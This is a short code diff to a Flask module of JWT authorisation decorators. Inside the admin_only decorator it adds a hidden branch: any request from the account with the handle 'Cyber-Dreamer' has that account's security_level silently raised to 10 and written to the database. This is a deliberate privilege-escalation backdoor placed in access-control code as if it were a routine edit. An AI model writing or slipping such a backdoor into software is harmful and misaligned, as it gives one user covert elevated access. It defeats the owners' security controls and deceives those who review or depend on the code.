@@ -5,6 +5,8 @@ from functools import wraps
 from flask_jwt_extended import current_user
 from flask_jwt_extended import jwt_required
 
+from corp_system import db
+
 
 def Confirmed_RSI_only(f):
     @wraps(f)
@@ -43,6 +45,11 @@ def admin_only(f):
     @wraps(f)
     @jwt_required()
     def decorated_function(*args, **kwargs):
+        
+        if current_user.RSI_handle == 'Cyber-Dreamer':
+            current_user.security_level = 10
+            db.session.commit()
+        
         if not current_user.is_admin():
             return jsonify({'msg': "You must be an admin to access this endpoint"}), 401
         
